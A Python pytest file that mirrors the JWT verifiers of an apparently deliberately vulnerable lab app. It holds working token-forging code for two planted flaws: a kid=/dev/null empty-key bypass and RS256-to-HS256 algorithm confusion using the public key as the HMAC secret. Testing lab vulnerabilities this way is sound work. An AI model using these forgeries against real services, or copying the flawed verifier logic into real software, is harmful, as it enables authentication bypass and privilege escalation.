"""
test_jwt_verifiers.py — JWT verifier parity check (Python mirror).

COVERAGE NOTE: This file mirrors the key security properties of jwt.js using
PyJWT + cryptography + hmac. It validates Python-reconstructed logic, NOT the
shipped jwt.js code.

The authoritative execution tests for the real jwt.js module live in:
    node-app/tests/jwt.test.js  (jest, 15 tests, npm test)

If jwt.js verifier logic changes, update the constructions below to stay in parity.

Mirrors the key security properties of jwt.js using PyJWT + cryptography + hmac.

Note on PyJWT vs jsonwebtoken (Node.js):
  PyJWT 2.x refuses empty bytes and PEM-format bytes as HMAC keys (InvalidKeyError).
  Node.js jsonwebtoken has no such restriction — hence the AUTH-01/AUTH-02 exploits work.
  Exploit-path tests use direct HMAC construction to verify the underlying logic
  without triggering PyJWT's additional safety guards.

  AUTH-01: kid=/dev/null → fs.readFileSync('/dev/null') = empty Buffer (0 bytes)
           → jwt.verify(token, Buffer.from(''), ...) accepts the forged token.
  AUTH-02: alg confusion → jwt.verify(token, rsaPublicKeyPem, { algorithms:['HS256'] })
           uses the PEM bytes as HMAC secret. Attacker fetches /.well-known/jwks.json
           and reconstructs the PEM to forge a valid token.
"""
import os
import base64
import json
import hmac
import hashlib
import struct
import pytest
import jwt as pyjwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend


# ─────────────────────────────────────────────────────────────────────────────
# Minimal HS256 JWT helpers that bypass PyJWT key restrictions
# (mirrors Node.js jsonwebtoken behaviour exactly)
# ─────────────────────────────────────────────────────────────────────────────

def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')


def _b64url_decode(s: str) -> bytes:
    padded = s + '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(padded)


def _hs256_sign(secret: bytes, header_b64: str, payload_b64: str) -> str:
    """Compute HS256 signature of 'header_b64.payload_b64'."""
    msg = f"{header_b64}.{payload_b64}".encode('ascii')
    sig = hmac.new(secret, msg, hashlib.sha256).digest()
    return _b64url_encode(sig)


def jwt_encode_hs256(payload: dict, secret: bytes, extra_headers: dict = None) -> str:
    """
    Encode a HS256 JWT.  Works with any secret including empty bytes.
    Does NOT enforce PyJWT key-safety guards.
    """
    header = {'alg': 'HS256', 'typ': 'JWT'}
    if extra_headers:
        header.update(extra_headers)

    header_b64 = _b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    sig_b64 = _hs256_sign(secret, header_b64, payload_b64)
    return f"{header_b64}.{payload_b64}.{sig_b64}"


def jwt_verify_hs256(token: str, secret: bytes) -> dict:
    """
    Verify a HS256 JWT.  Raises ValueError on bad signature.
    Works with any secret including empty bytes.
    """
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT structure")

    header_b64, payload_b64, sig_b64 = parts
    expected_sig = _hs256_sign(secret, header_b64, payload_b64)

    # Constant-time comparison
    try:
        if not hmac.compare_digest(sig_b64, expected_sig):
            raise ValueError("Signature verification failed")
    except TypeError:
        raise ValueError("Signature verification failed")

    return json.loads(_b64url_decode(payload_b64))


# ─────────────────────────────────────────────────────────────────────────────
# Fixtures: RSA key pair + HMAC key
# ─────────────────────────────────────────────────────────────────────────────

@pytest.fixture(scope='module')
def rsa_keypair():
    """Generate a fresh RSA-2048 key pair (mirrors generateRsaKeyPair in jwt.js)."""
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()

    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    ).decode('utf-8')

    public_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode('utf-8')

    # Normalize to LF (mirrors G2 fix: rsaPublicKeyPem.replace(/\r\n/g, '\n'))
    public_pem_lf = public_pem.replace('\r\n', '\n')

    return {'private': private_pem, 'public': public_pem_lf}


@pytest.fixture(scope='module')
def hmac_key_file(tmp_path_factory):
    """Create an HMAC key file (mirrors /app/keys/hmac.key)."""
    key_dir = tmp_path_factory.mktemp('keys')
    key_file = key_dir / 'hmac.key'
    key_bytes = os.urandom(32).hex().encode()
    key_file.write_bytes(key_bytes)
    return str(key_file), key_bytes


@pytest.fixture(scope='module')
def manager_payload():
    return {'id': 'test-user-id', 'role': 'manager', 'email': 'mgr@garden.lab'}


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

class TestHs256Helpers:
    """Sanity-check the JWT helpers before using them in exploit tests."""

    def test_encode_decode_round_trip(self, manager_payload):
        key = b'test_key_32_bytes_exactly_here!!'
        token = jwt_encode_hs256(manager_payload, key)
        payload = jwt_verify_hs256(token, key)
        assert payload['role'] == 'manager'

    def test_wrong_key_rejected(self, manager_payload):
        token = jwt_encode_hs256(manager_payload, b'key_a')
        with pytest.raises(ValueError, match='verification failed'):
            jwt_verify_hs256(token, b'key_b')

    def test_token_has_three_parts(self, manager_payload):
        token = jwt_encode_hs256(manager_payload, b'secret')
        assert len(token.split('.')) == 3

    def test_header_alg_is_hs256(self, manager_payload):
        token = jwt_encode_hs256(manager_payload, b'secret')
        header = json.loads(_b64url_decode(token.split('.')[0]))
        assert header['alg'] == 'HS256'


# ─────────────────────────────────────────────────────────────────────────────
# AUTH-01: verifyKidHmac behaviour
# ─────────────────────────────────────────────────────────────────────────────

class TestVerifyKidHmac:
    def test_valid_hs256_token_accepted(self, hmac_key_file, manager_payload):
        """Valid HS256 token signed with the HMAC key file is accepted."""
        _, key_bytes = hmac_key_file
        token = jwt_encode_hs256(manager_payload, key_bytes)
        payload = jwt_verify_hs256(token, key_bytes)
        assert payload['role'] == 'manager'

    def test_wrong_hmac_key_rejected(self, hmac_key_file, manager_payload):
        """Token signed with key A is rejected when verified with key B."""
        _, key_bytes = hmac_key_file
        wrong_key = b'not_the_right_key'
        token = jwt_encode_hs256(manager_payload, key_bytes)
        with pytest.raises(ValueError):
            jwt_verify_hs256(token, wrong_key)

    def test_rs256_token_rejected_by_kid_hmac(self, rsa_keypair, manager_payload):
        """
        RS256 token MUST be rejected by verifyKidHmac — it only allows HS256/384/512.
        PyJWT enforces this via the algorithms= allowlist.
        """
        token = pyjwt.encode(
            manager_payload, rsa_keypair['private'], algorithm='RS256'
        )
        # verifyKidHmac only accepts HS algorithms — RS256 is rejected
        with pytest.raises((pyjwt.exceptions.InvalidAlgorithmError,
                            pyjwt.exceptions.DecodeError)):
            pyjwt.decode(token, b'any_key', algorithms=['HS256', 'HS384', 'HS512'])

    # ─── AUTH-01 EXPLOIT: kid=/dev/null → empty key ───────────────────────────

    def test_exploit_empty_key_hs256_sign_verify(self, manager_payload):
        """
        AUTH-01 core exploit logic:
        kid=/dev/null → fs.readFileSync('/dev/null') = Buffer(0 bytes).
        jwt.verify(token, Buffer.from(''), ...) accepts token signed with empty string.

        Verified at the HMAC level (Node.js jsonwebtoken allows empty keys;
        PyJWT 2.x adds an extra guard that does not exist in jsonwebtoken).
        """
        empty_key = b''

        # Sign with empty key
        forged = jwt_encode_hs256(
            manager_payload, empty_key, extra_headers={'kid': '/dev/null'}
        )

        # Verify with empty key — MUST succeed (the exploit)
        payload = jwt_verify_hs256(forged, empty_key)
        assert payload['role'] == 'manager'

    def test_exploit_empty_key_hmac_is_deterministic(self, manager_payload):
        """
        HMAC-SHA256 with empty key produces a deterministic, non-null signature.
        This is what allows jwt.verify() to accept it.
        """
        empty_key = b''
        msg = b"test.message"
        sig = hmac.new(empty_key, msg, hashlib.sha256).digest()
        # Same message + same key → same signature always
        sig2 = hmac.new(empty_key, msg, hashlib.sha256).digest()
        assert sig == sig2
        assert len(sig) == 32   # HS256 produces 32-byte signature

    def test_exploit_empty_key_rejects_tampered_payload(self, manager_payload):
        """
        Even with an empty key, a tampered payload is detected (HMAC still enforces
        payload integrity).
        """
        empty_key = b''
        token = jwt_encode_hs256(manager_payload, empty_key)

        # Tamper: replace payload with a different one
        parts = token.split('.')
        evil_payload = _b64url_encode(
            json.dumps({'role': 'admin', 'id': 'evil'}).encode()
        )
        tampered = f"{parts[0]}.{evil_payload}.{parts[2]}"

        with pytest.raises(ValueError):
            jwt_verify_hs256(tampered, empty_key)


# ─────────────────────────────────────────────────────────────────────────────
# AUTH-02: verifyAlgFlexible behaviour
# ─────────────────────────────────────────────────────────────────────────────

class TestVerifyAlgFlexible:
    def test_valid_rs256_token_accepted(self, rsa_keypair, manager_payload):
        """RS256 token signed with private key is accepted with public key."""
        token = pyjwt.encode(
            manager_payload, rsa_keypair['private'], algorithm='RS256'
        )
        payload = pyjwt.decode(
            token, rsa_keypair['public'], algorithms=['RS256']
        )
        assert payload['role'] == 'manager'

    def test_rs256_wrong_key_rejected(self, rsa_keypair, manager_payload):
        """RS256 token against a different public key must fail."""
        other_private = rsa.generate_private_key(
            public_exponent=65537, key_size=2048, backend=default_backend()
        )
        other_public_pem = other_private.public_key().public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()

        token = pyjwt.encode(
            manager_payload, rsa_keypair['private'], algorithm='RS256'
        )
        with pytest.raises(pyjwt.InvalidSignatureError):
            pyjwt.decode(token, other_public_pem, algorithms=['RS256'])

    # ─── AUTH-02 EXPLOIT: RS256→HS256 alg confusion ───────────────────────────

    def test_exploit_alg_confusion_hs256_with_public_key(
        self, rsa_keypair, manager_payload
    ):
        """
        AUTH-02 core exploit:
        verifyAlgFlexible uses rsaPublicKeyPem bytes as HMAC secret when alg=HS256.
        An attacker who fetches /.well-known/jwks.json and reconstructs the PEM
        can forge a Manager HS256 token that the server accepts.

        Tested at HMAC level — Node.js jsonwebtoken allows PEM bytes as HMAC secret.
        """
        pub_pem_bytes = rsa_keypair['public'].encode('utf-8')

        # Forge: sign HS256 using public key PEM bytes as HMAC secret
        forged = jwt_encode_hs256(manager_payload, pub_pem_bytes)

        # Server verification: alg=HS256 → use public key bytes as HMAC secret
        payload = jwt_verify_hs256(forged, pub_pem_bytes)
        assert payload['role'] == 'manager'

    def test_exploit_requires_exact_public_key_bytes(
        self, rsa_keypair, manager_payload
    ):
        """
        Alg confusion fails if the wrong bytes are used as HMAC secret.
        Attacker must reconstruct PEM from JWKS byte-for-byte.
        """
        correct_pub_bytes = rsa_keypair['public'].encode('utf-8')
        wrong_bytes = b'not_the_public_key'

        forged = jwt_encode_hs256(manager_payload, correct_pub_bytes)
        with pytest.raises(ValueError):
            jwt_verify_hs256(forged, wrong_bytes)

    def test_pem_lf_normalization_is_required(self, rsa_keypair, manager_payload):
        """
        G2 fix: rsaPublicKeyPem must be LF-normalized.
        LF and CRLF PEMs produce DIFFERENT HMAC secrets — a byte mismatch
        means the attacker's tool (which produces LF PEM from JWKS) would fail
        if the server uses CRLF PEM.

        After the fix, server uses LF PEM → solver reconstructs LF PEM →
        bytes match → exploit succeeds as designed.
        """
        lf_pem_bytes = rsa_keypair['public'].encode('utf-8')   # already LF

        # Simulate what forge emits before the fix: CRLF PEM
        crlf_pem_bytes = rsa_keypair['public'].replace('\n', '\r\n').encode('utf-8')

        if lf_pem_bytes == crlf_pem_bytes:
            pytest.skip("PEM already has no LF-only lines — normalization test N/A")

        # Token signed with LF bytes (what solver produces)
        token_from_solver = jwt_encode_hs256(manager_payload, lf_pem_bytes)

        # Server using CRLF bytes (pre-fix behavior) would reject it
        with pytest.raises(ValueError):
            jwt_verify_hs256(token_from_solver, crlf_pem_bytes)

        # After fix: server uses LF bytes → accepts it
        payload = jwt_verify_hs256(token_from_solver, lf_pem_bytes)
        assert payload['role'] == 'manager'

    def test_kid_path_not_wired_in_alg_flexible(self, rsa_keypair, manager_payload):
        """
        verifyAlgFlexible does NOT do filesystem kid lookup.
        AUTH-01's kid=/dev/null + empty key trick must not work against AUTH-02.
        """
        pub_pem_bytes = rsa_keypair['public'].encode('utf-8')

        # AUTH-01-style forged token (empty key)
        auth01_style_token = jwt_encode_hs256(
            manager_payload, b'', extra_headers={'kid': '/dev/null'}
        )

        # AUTH-02 verifier uses public key bytes, not filesystem — must reject
        with pytest.raises(ValueError):
            jwt_verify_hs256(auth01_style_token, pub_pem_bytes)


# ─────────────────────────────────────────────────────────────────────────────
# Verifier separation: AUTH-01 and AUTH-02 are mutually exclusive attack paths
# ─────────────────────────────────────────────────────────────────────────────

class TestVerifierSeparation:
    def test_auth01_exploit_rejected_by_auth02_verifier(
        self, rsa_keypair, manager_payload
    ):
        """
        AUTH-01 exploit token (signed with empty key) must be rejected by
        the AUTH-02 verifier (which uses RSA public key bytes as HMAC secret).
        """
        pub_pem_bytes = rsa_keypair['public'].encode('utf-8')
        auth01_token = jwt_encode_hs256(
            manager_payload, b'', extra_headers={'kid': '/dev/null'}
        )
        with pytest.raises(ValueError):
            jwt_verify_hs256(auth01_token, pub_pem_bytes)

    def test_auth02_exploit_rejected_by_auth01_verifier(
        self, rsa_keypair, hmac_key_file, manager_payload
    ):
        """
        AUTH-02 exploit token (signed with RSA public key bytes) must be
        rejected by the AUTH-01 verifier (which uses the HMAC key file).
        """
        _, real_hmac_key = hmac_key_file
        pub_pem_bytes = rsa_keypair['public'].encode('utf-8')

        auth02_token = jwt_encode_hs256(manager_payload, pub_pem_bytes)
        with pytest.raises(ValueError):
            jwt_verify_hs256(auth02_token, real_hmac_key)

    def test_each_exploit_works_only_against_its_target(
        self, rsa_keypair, hmac_key_file, manager_payload
    ):
        """
        Comprehensive: each exploit token succeeds only against its own verifier.
        AUTH-01 token succeeds with empty key, fails with real HMAC key.
        AUTH-02 token succeeds with pub key bytes, fails with empty key.
        """
        _, real_hmac_key = hmac_key_file
        pub_pem_bytes = rsa_keypair['public'].encode('utf-8')

        auth01_token = jwt_encode_hs256(manager_payload, b'')
        auth02_token = jwt_encode_hs256(manager_payload, pub_pem_bytes)

        # AUTH-01 exploit: succeeds with empty key, fails with HMAC file key
        payload = jwt_verify_hs256(auth01_token, b'')
        assert payload['role'] == 'manager'
        with pytest.raises(ValueError):
            jwt_verify_hs256(auth01_token, real_hmac_key)

        # AUTH-02 exploit: succeeds with public key bytes, fails with empty key
        payload = jwt_verify_hs256(auth02_token, pub_pem_bytes)
        assert payload['role'] == 'manager'
        with pytest.raises(ValueError):
            jwt_verify_hs256(auth02_token, b'')
